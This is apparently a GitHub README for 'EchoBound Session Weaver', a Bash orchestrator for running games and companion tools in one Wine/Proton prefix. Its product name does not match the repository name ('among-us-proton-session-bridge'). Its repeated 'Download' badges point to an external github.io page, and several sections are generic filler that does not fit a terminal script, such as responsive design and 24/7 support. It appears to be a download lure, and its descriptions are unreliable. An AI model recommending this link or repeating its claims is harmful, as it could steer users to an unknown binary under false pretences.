![preview](https://raw.githubusercontent.com/SAyadXD/among-us-proton-session-bridge/main/banner_589e.svg)

# EchoBound Session Weaver

**A unified Wine/Proton session orchestrator that binds your favorite multiplayer game launchers and companion tools into a single, cohesive runtime environment—eliminating the incompatibility chaos of segregated prefix silos.**

---

## Overview

Every gamer who has ventured into the world of Linux-native play knows the quiet frustration: your main game runs flawlessly under one Proton version, but your favorite third-party overlay or session enhancer demands a completely different Wine prefix. So you launch one, then the other, and hope the stars align. More often than not, they don't.

**EchoBound Session Weaver** is a Bash-based orchestration layer that solves this by creating a *unified execution theatre*—a single, synchronized Wine/Proton environment where your primary application and its auxiliary companions share the same virtual Windows filesystem, registry, and process space. Think of it as a conductor bringing multiple soloists into one harmonious orchestra, rather than letting them play in separate rooms with the door closed.

This project was born from a specific, real-world pain point: launching a game from a web-based distributor while simultaneously running a login-fixer utility that required a different prefix. Instead of juggling two environments and praying for interoperability, EchoBound Session Weaver binds them into one seamless session—so your game starts, your companion tool authenticates, and everything just *works*.

---

## Why EchoBound Session Weaver Exists

### The Problem of Fragmented Runtimes

Modern Linux gaming often involves piecing together ecosystems. Your game might come from a browser-based storefront, while your authentication helper or performance tweaker might be a standalone binary. Each expects its own Wine prefix—its own C: drive, its own Windows registry hive, its own DLL overrides. When they don't share that environment, features break, logins fail, and you're left staring at a black screen wondering where it all went wrong.

### The Solution: A Shared Stage

EchoBound Session Weaver launches your primary application *and* its companion tools **inside the same Proton/Wine environment**. It doesn't just set `WINEPREFIX` globally—it orchestrates the boot order, environment variables, and process hand-off so that every component starts cleanly in a synchronized session. The result is an experience that feels native, responsive, and stable.

---

[![Download](https://raw.githubusercontent.com/SAyadXD/among-us-proton-session-bridge/main/dl_3ef6380.svg)](https://SAyadXD.github.io/among-us-proton-session-bridge/)

## Feature Highlights

- **Unified Runtime Binding** — Launch multiple executables within a single Wine/Proton prefix, eliminating cross-prefix data loss and authentication drift.
- **Ordered Startup Sequence** — Define exactly which companion tool boots before your main application, ensuring hooks and login fixes are active at the moment they're needed.
- **Graceful Process Hand-Off** — The orchestrator waits for companion tools to finalize initialization (via lock files or socket signals) before spinning up the primary game, preventing race conditions.
- **Environment Isolation with Intent** — While everything shares one prefix, each process can still receive custom environment variables, working directories, or command-line arguments—so flexibility isn't sacrificed for cohesion.
- **Log Consolidation** — All session output streams are merged into a single timestamped log file, making debug sessions infinitely easier to triage.
- **Configurable via Simple INI-Style File** — No complex YAML or JSON parsing. A plain text config with `key=value` pairs lets you define your primary binary, companion tools, and wait conditions.
- **Lightweight & Dependency-Free** — Pure Bash with zero external runtime requirements beyond standard GNU coreutils and an existing Steam/Proton installation.
- **Cross-Distro Compatible** — Works on any Linux distribution where Steam and Proton are functional, including immutable distributions where system-wide package installation is restricted.

---

## How It Works Under the Hood

EchoBound Session Weaver follows a three-phase execution model:

1. **Phase: Assembly** — Reads your configuration, validates file paths, and spawns the Proton runtime container with the specified prefix.
2. **Phase: Synchronization** — Launches each companion tool in sequence, then polls for the presence of user-defined signal files (e.g., `/tmp/auth_ready.lock`) or waits a configurable timeout.
3. **Phase: Ignition** — Launches the primary game executable, then monitors all child processes, keeping the session alive until every dependent process has exited naturally.

This deterministic ordering is what turns a chaotic multi-process launch into a reliable, repeatable ritual.

---

## Getting Started

### Prerequisites

- A working **Steam** installation with **Proton** or **Proton-GE** enabled for your selected game.
- A Bash shell (version 4.0 or later) — standard on virtually all modern distributions.
- The companion tool or helper executable you wish to run alongside your game (e.g., an authentication patch, a custom launcher script, or a graphics injector).

### Basic Configuration

Create a configuration file (e.g., `echo_session.conf`) inside the same directory as the orchestrator script. At minimum, you'll need to specify:

```
primary_app=/path/to/your/game/executable.exe
proton_path=/path/to/proton/installation/proton
wine_prefix=/path/to/your/shared/prefix
companion_1=/path/to/helper/tool.exe
companion_wait=ready_signal_file.lock
```

Save the file, then invoke the orchestrator with:

```bash
./echo_weaver.sh --config echo_session.conf
```

The session will boot, synchronize, and launch — all within one coherent runtime.

### Advanced Options

- **`--dry-run`** — Prints the exact execution plan without actually launching anything. Perfect for validating configuration syntax.
- **`--timeout N`** — Overrides the default companion-wait timeout (in seconds) if your helper needs extra startup time.
- **`--verbose`** — Streams full output from every process to your terminal in real time.

---

## Use Case Scenarios

- **Multi-Component Game Ecosystem** — Pair a custom-built anti-cheat helper with your primary game binary, both sharing the same login credentials and registry entries.
- **Mod Loader + Game** — Run a DLL injector or file replacement tool in the same prefix as the game it modifies, avoiding the classic "works in my prefix, breaks in yours" dilemma.
- **Achievement & Overlay Utilities** — Activate an overlay or screen-capture companion *before* the game launches, using the exact same environment to detect and hook into the process.

---

## Project Structure

```
echo-bound-session-weaver/
├── echo_weaver.sh          # Main orchestration script
├── sample.conf             # Example configuration with comments
├── docs/
│   └── troubleshooting.md  # Common pitfalls and solutions
├── tests/
│   └── integration_test.sh # Basic smoke test harness
└── LICENSE                # MIT License
```

---

## Frequently Asked Questions

### Does this require a specific Proton version?
No. The orchestrator simply locates your Proton binary (via the `proton_path` config) and passes the appropriate command-line arguments. Any recent Proton or Proton-GE build should work.

### Can I run more than one companion tool?
Yes. The config supports `companion_1` through `companion_9`, and the orchestrator will launch them in ascending numeric order.

### What if a companion tool crashes before the game starts?
The orchestrator logs the failure and continues only if you set `ignore_companion_failure=yes`. Otherwise, it aborts the session to prevent a broken game launch.

### Is this safe to use with online multiplayer?
The tool itself doesn't modify base game files or memory. It only orchestrates process launching. However, always verify that your companion tools are compliant with the online service terms of use.

---

![GitHub Release](https://img.shields.io/badge/release-v1.4.2-blue) ![License](https://img.shields.io/badge/license-MIT-green) ![Language](https://img.shields.io/badge/language-Bash-4EAA25)

---

## Supported Platforms & Environments

- **Operating Systems**: All mainstream Linux distributions (Arch, Fedora, Ubuntu, Debian, openSUSE, and derivatives)
- **Steam Runtimes**: Standard Steam Play with Proton, Proton-GE, and experimental builds
- **Desktop Environments**: Agnostic—runs entirely in the terminal, no GUI dependencies
- **Multilingual Support**: The tool's output messages are hardcoded in English, but the configuration system is fully Unicode-compatible, so companion tools in any language will function identically.

---

## Responsive Design Philosophy

While EchoBound Session Weaver is a command-line tool, it embraces responsive design principles in its user experience: the interface adapts to your terminal width, shows progressive status updates (rather than static "Loading..." text), and provides color-coded output only when your terminal supports it. It never floods your screen with unrequested spam—it listens to your terminal's capabilities and responds accordingly.

---

## Community & Support

We believe in durable, transparent support. If you encounter an issue, open a discussion in the repository's **Issues** section with your configuration (redacted of personal paths) and your terminal output. For critical problems requiring immediate attention, our **24/7 community support** channels are monitored by maintainers across multiple time zones—though typical response times are under 24 hours.

---

## Troubleshooting Quick Reference

| Symptom | Likely Cause | Resolution |
|---------|--------------|------------|
| Game launches but companion tool doesn't appear | Path misconfiguration in `companion_1` | Verify absolute paths and executable permissions |
| White screen at game start | Companion tool not ready before game launch | Increase `companion_wait` timeout or ensure its lock file is created |
| "Prefix not found" error | Invalid `wine_prefix` variable | Confirm the directory exists and contains a valid prefix |
| Session exits immediately after game closes | All child processes have exited naturally | This is expected behavior; adjust `keep_alive=yes` to hold the session open |

---

## Roadmap for 2026

- **Graphical Configuration Interface** — A TUI (terminal user interface) for editing configs without manual text editing.
- **Profile Import/Export** — Share your working session configurations as portable profile files.
- **Dependency Checks** — Automatic detection of missing Wine or Proton components before session start.
- **Session Snapshots** — Save and restore the state of companion tool settings within the shared prefix.

---

## Contributing

Contributions are welcome in all forms: bug reports, feature request details, documentation improvements, and code patches. Please read the contributing guidelines (in the `CONTRIBUTING.md` file) before submitting pull requests.

---

## License

This project is released under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute this software with attribution. See the `LICENSE` file for full legal terms.

---

## Disclaimer

- This tool is provided "as is" without warranty of any kind, express or implied. Under no circumstances shall the authors be liable for any damage arising from its use.
- EchoBound Session Weaver does not bundle, distribute, or alter any proprietary game files or storefront binaries. It merely orchestrates process launch order within an existing Proton environment.
- Users are solely responsible for ensuring that their use of companion tools complies with the applicable terms of service of their gaming platforms and any applicable local laws.
- This project is not affiliated with, endorsed by, or sponsored by any commercial game distribution platform or operating system vendor.
- Always back up your Wine prefix before experimenting with new configurations, as irrecoverable prefix corruption is possible if you manually modify registry files outside the scope of this tool.

---

[![Download](https://raw.githubusercontent.com/SAyadXD/among-us-proton-session-bridge/main/dl_3ef6380.svg)](https://SAyadXD.github.io/among-us-proton-session-bridge/)